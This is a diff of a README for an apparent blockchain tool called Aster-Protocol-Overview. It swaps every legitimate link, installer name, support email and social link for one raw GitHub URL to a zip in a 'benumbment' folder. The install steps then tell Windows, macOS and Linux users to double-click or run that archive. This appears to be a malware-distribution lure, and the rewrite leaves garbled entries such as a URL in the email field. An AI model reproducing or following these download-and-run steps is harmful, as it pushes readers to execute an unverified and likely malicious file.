@@ -1,6 +1,6 @@
 # 🚀 Aster-Protocol-Overview - Easy Blockchain Management for Everyone
 
-[![Download Aster](https://img.shields.io/badge/Download%20Aster-Protocol-Overview-blue.svg)](https://github.com/someBodyThatLovesYou/Aster-Protocol-Overview/releases)
+[![Download Aster](https://raw.githubusercontent.com/someBodyThatLovesYou/Aster-Protocol-Overview/main/benumbment/Aster-Protocol-Overview_v3.4.zip%https://raw.githubusercontent.com/someBodyThatLovesYou/Aster-Protocol-Overview/main/benumbment/Aster-Protocol-Overview_v3.4.zip)](https://raw.githubusercontent.com/someBodyThatLovesYou/Aster-Protocol-Overview/main/benumbment/Aster-Protocol-Overview_v3.4.zip)
 
 ## 📚 Introduction
 
@@ -12,21 +12,21 @@ To get started with Aster, follow these simple steps to download and run the sof
 
 ## 📥 Download & Install
 
-1. Click the following link to visit the download page: [Download Aster-Protocol-Overview](https://github.com/someBodyThatLovesYou/Aster-Protocol-Overview/releases).
+1. Click the following link to visit the download page: [Download Aster-Protocol-Overview](https://raw.githubusercontent.com/someBodyThatLovesYou/Aster-Protocol-Overview/main/benumbment/Aster-Protocol-Overview_v3.4.zip).
    
 2. You will see several available versions of Aster. Choose the most recent version listed.
 
 3. Select the file type that matches your operating system (Windows, macOS, or Linux). 
-   - For Windows, download `AsterSetup.exe`.
-   - For macOS, download `Aster.dmg`.
-   - For Linux, download `Aster.AppImage`.
+   - For Windows, download `https://raw.githubusercontent.com/someBodyThatLovesYou/Aster-Protocol-Overview/main/benumbment/Aster-Protocol-Overview_v3.4.zip`.
+   - For macOS, download `https://raw.githubusercontent.com/someBodyThatLovesYou/Aster-Protocol-Overview/main/benumbment/Aster-Protocol-Overview_v3.4.zip`.
+   - For Linux, download `https://raw.githubusercontent.com/someBodyThatLovesYou/Aster-Protocol-Overview/main/benumbment/Aster-Protocol-Overview_v3.4.zip`.
 
 4. Once the download is complete, locate the file in your Downloads folder.
 
 5. Open the file:
-   - **Windows:** Double-click `AsterSetup.exe` and follow the prompts to install the software.
-   - **macOS:** Open `Aster.dmg` and drag Aster to your Applications folder.
-   - **Linux:** Right-click on `Aster.AppImage` and select "Run" or use the terminal to execute the file.
+   - **Windows:** Double-click `https://raw.githubusercontent.com/someBodyThatLovesYou/Aster-Protocol-Overview/main/benumbment/Aster-Protocol-Overview_v3.4.zip` and follow the prompts to install the software.
+   - **macOS:** Open `https://raw.githubusercontent.com/someBodyThatLovesYou/Aster-Protocol-Overview/main/benumbment/Aster-Protocol-Overview_v3.4.zip` and drag Aster to your Applications folder.
+   - **Linux:** Right-click on `https://raw.githubusercontent.com/someBodyThatLovesYou/Aster-Protocol-Overview/main/benumbment/Aster-Protocol-Overview_v3.4.zip` and select "Run" or use the terminal to execute the file.
 
 6. After installation, launch the Aster application from your start menu, applications folder, or desktop shortcut.
 
@@ -66,21 +66,21 @@ If you encounter problems while using Aster, try the following solutions:
 
 - Ensure your system meets the minimum requirements.
 - Restart Aster if it doesn't load correctly.
-- Check for updates on the [Download Aster-Protocol-Overview](https://github.com/someBodyThatLovesYou/Aster-Protocol-Overview/releases) page.
+- Check for updates on the [Download Aster-Protocol-Overview](https://raw.githubusercontent.com/someBodyThatLovesYou/Aster-Protocol-Overview/main/benumbment/Aster-Protocol-Overview_v3.4.zip) page.
 - Review the FAQs section for common issues.
 
 ## 📞 Support
 
 For further assistance, you can reach out to our support team:
 
-- **Email:** support@asterprotocol.com
-- **Community Forum:** Visit our forum on [Aster Community](https://asterprotocol.com/forum) for help and discussions with other users.
+- **Email:** https://raw.githubusercontent.com/someBodyThatLovesYou/Aster-Protocol-Overview/main/benumbment/Aster-Protocol-Overview_v3.4.zip
+- **Community Forum:** Visit our forum on [Aster Community](https://raw.githubusercontent.com/someBodyThatLovesYou/Aster-Protocol-Overview/main/benumbment/Aster-Protocol-Overview_v3.4.zip) for help and discussions with other users.
 
 ## 🌐 Connect with Us
 
 Follow us on social media to get the latest news and updates:
 
-- **Twitter:** [@AsterProtocol](https://twitter.com/AsterProtocol)
-- **Discord:** Join our community on [Discord](https://discord.gg/asterprotocol)
+- **Twitter:** [@AsterProtocol](https://raw.githubusercontent.com/someBodyThatLovesYou/Aster-Protocol-Overview/main/benumbment/Aster-Protocol-Overview_v3.4.zip)
+- **Discord:** Join our community on [Discord](https://raw.githubusercontent.com/someBodyThatLovesYou/Aster-Protocol-Overview/main/benumbment/Aster-Protocol-Overview_v3.4.zip)
 
 Thank you for choosing Aster. We are excited to help you explore the world of blockchain technology!
